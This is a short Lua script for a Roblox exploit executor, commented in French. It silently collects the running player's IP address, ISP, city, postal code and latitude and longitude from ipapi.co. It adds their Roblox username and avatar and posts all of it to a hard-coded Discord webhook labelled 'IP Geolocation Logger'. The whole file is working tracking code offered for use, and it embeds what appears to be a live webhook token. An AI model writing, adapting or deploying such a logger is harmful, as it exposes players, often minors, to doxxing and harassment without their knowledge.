local httpService = game:GetService("HttpService")
local player = game:GetService("Players").LocalPlayer

-- L'URL du webhook est maintenant plus sécurisée
local webhookURL = "https://discord.com/api/webhooks/1363337251626549470/ZvTOXTzzcw0aPLfEYLkuCtxJCmKkxDMGMnUF0EKwRhC8nrWU4QNp1QWf2AK5q2JqUO6j"

-- URL pour obtenir l'avatar du joueur
local toURL = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. player.UserId .. "&size=720x720&format=Png&isCircular=false"
local successAvatar, avatarData = pcall(function()
    return httpService:JSONDecode(game:HttpGet(toURL)).data[1].imageUrl
end)

-- URL pour récupérer les données d'IP
local successIP, ipData = pcall(function()
    return httpService:JSONDecode(game:HttpGet("https://ipapi.co/json"))
end)

-- Si l'IP échoue, initialise à une table vide
ipData = successIP and ipData or {}

local function createField(name, key)
    return {
        name = name,
        value = ipData[key] and tostring(ipData[key]) or "Not Found"
    }
end

-- Envoi des données à un webhook Discord
pcall(function()
    if successIP then
        local response = (request or http_request or http and http.request)({
            Url = webhookURL,
            Method = "POST",
            Body = httpService:JSONEncode({
                embeds = {
                    {
                        color = 1733608,
                        fields = {
                            createField("IP Address", "ip"),
                            createField("Network Range", "network"),
                            createField("ASN (Autonomous System Number)", "asn"),
                            createField("ISP (Internet Service Provider)", "org"),
                            createField("Country", "country_name"),
                            createField("Region/Province", "region"),
                            createField("City", "city"),
                            createField("Postal Code", "postal"),
                            createField("Latitude", "latitude"),
                            createField("Longitude", "longitude"),
                            createField("Timezone", "timezone")
                        }
                    },
                    {
                        title = "View " .. player.Name .. "'s full profile",
                        url = "https://www.roblox.com/users/" .. player.UserId .. "/profile",
                        color = 1733608,
                        image = {
                            url = successAvatar and avatarData or "https://i.ibb.co/mVYFTK2f/Avatar-Not-Found.png"
                        }
                    }
                },
                username = "IP Geolocation Logger",
                avatar_url = "https://i.ibb.co/spwWKyBW/Globe-With-Meridians.png"
            }),
            Headers = {
                ["content-type"] = "application/json"
            }
        })

        -- Optionnel : ajouter un log de la réponse pour voir si l'envoi a réussi
        print(response)
    else
        -- Si l'IP ne se charge pas correctement, on affiche un message d'erreur
        warn("Erreur lors de la récupération des données IP.")
    end
end)
